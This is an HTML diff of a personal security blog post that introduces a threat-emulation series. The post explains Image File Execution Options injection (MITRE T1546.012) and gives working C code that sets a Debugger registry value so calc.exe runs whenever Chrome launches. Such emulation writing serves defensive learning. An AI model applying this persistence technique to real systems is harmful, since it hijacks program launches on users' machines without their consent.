@@ -6,11 +6,12 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
   <meta name="generator" content="Hugo 0.92.2" />
-  <link rel="canonical" href="https://1d8.github.io/publications/" />
+  <link rel="canonical" href="https://1d8.github.io/publications/threatactemulation_1/" />
 
   
     
-    <meta name="description" content="Publications">
+    <meta name="description" content="Description: This post is an introductory post to a series of blog posts that I’ll be diving into which will detail emulating threat actors and their associated TTPs with code.
+In this particular blog post, we’ll be diving into the topic of persistence which can be accomplished by manipulating Windows registry key values! Specifically, we’ll be examining the Event Trigger Execution Technique in which an attacker modify system mechanisms to gain execution based upon specific events.">
   
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
@@ -60,7 +61,7 @@
 
   
   
-  <title>Publications | </title>
+  <title>Threat Emulation Series - Introduction - Event Triggered Execution | </title>
 </head>
 
   <body>
@@ -225,7 +226,7 @@
       
       
       
-      <a href="/publications/" aria-current="page">
+      <a href="/publications/" >
         <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
           <use href="#bookmark"></use>
         </svg>
@@ -255,116 +256,47 @@
       <div class="main-and-footer">
         <div>
           
-<main id="main">
-  <h1>Publications</h1>
-  
-  <input
-    id="search"
-    type="text"
-    placeholder="Search by title..."
-    aria-label="Search by title"
-  />
-  
-  <ul class="patterns-list" id="list">
-    
-    <li>
-      <h2>
-        <a href="/publications/pyapi/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          Windows API Programming with Python
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/publications/threatactemulation_1/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          Threat Emulation Series - Introduction - Event Triggered Execution
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/publications/remcosdocdropperanalysis/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          Malware Analysis of Maldoc For Remcos RAT
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/publications/dmasoft_cookiestealer/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          Dmasoft PrivEsc Exploit
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/publications/llmnrpoisoning/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          Diving Into LLMNR Poisoning
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/publications/ansibletrix/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          Ansible Trix
-        </a>
-      </h2>
-    </li>
-    
-  </ul>
-</main>
+  <main id="main">
+    <h1>Threat Emulation Series - Introduction - Event Triggered Execution</h1>
+    <p><strong>Description: This post is an introductory post to a series of blog posts that I&rsquo;ll be diving into which will detail emulating threat actors and their associated TTPs with code.</strong></p>
+<p>In this particular blog post, we&rsquo;ll be diving into the topic of persistence which can be accomplished by manipulating Windows registry key values! Specifically, we&rsquo;ll be examining the <a href="https://attack.mitre.org/techniques/T1546/">Event Trigger Execution Technique</a> in which an attacker modify system mechanisms to gain execution based upon specific events.</p>
+<p>A great example of this is <a href="https://attack.mitre.org/techniques/T1546/012/">Image File Execution Options Injection</a> in which malicious content, such as malware, can be executed upon a specific event happening, such as an application opening, by modifying the debugger value within the registry for a specific application.</p>
+<p>So a general overview would be: We add a debugger value to a specific application and point it to our malware, such as a browser, and each time a user launches the browser, our malware would execute.</p>
+<p>Let&rsquo;s say we were targeting the Chrome application which has a registry key located at <code>HKLM:/Software/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/chrome.exe</code>.</p>
+<p>So we&rsquo;d want to add a <code>Debugger</code> subkey &amp; set its value to be the full path to our <em>malicious</em> executable (in this case, it&rsquo;s a classic <code>calc.exe</code> example).</p>
+<p>We can do this via Powershell:
+<img src="https://i.ibb.co/XbT9nNb/2024-06-25-21-39.png" alt=""></p>
+<p>Or we can do it via compiled C code using the Windows API (my personal favorite):</p>
+<pre><code class="language-c">// Event Triggered Execution: Image File Execution Options Injection (T1546.012), Sub-Technique of Event Triggered Execution
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+char szEvilExecutable[] = {&quot;C:\\Windows\\System32\\calc.exe&quot;};
+char szSubKeyName[] = {&quot;Debugger&quot;};
+char szTargetKey[] = {&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe&quot;};
+
+
+int main() {
+    HKEY hKey;
+    LSTATUS openResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, szTargetKey, 0, KEY_ALL_ACCESS, &amp;hKey);
+    if (openResult == ERROR_SUCCESS) {
+        printf(&quot;Opened registry key\n&quot;);
+    }
+    LSTATUS setResult = RegSetValueEx(hKey, szSubKeyName, 0, REG_SZ, szEvilExecutable, sizeof(szEvilExecutable));
+    if (setResult == ERROR_SUCCESS) {
+        printf(&quot;Set the registry key value!\n&quot;);
+    } else {
+        printf(&quot;Error setting registry key value\n&quot;);
+    }
+    RegCloseKey(hKey);
+    return 0;
+}
+</code></pre>
+<p>And this is how it&rsquo;d look running:</p>
+<p><img src="https://i.imgur.com/byHYEqy.gif" alt=""></p>
+
+  </main>
 
           
             <footer role="contentinfo">
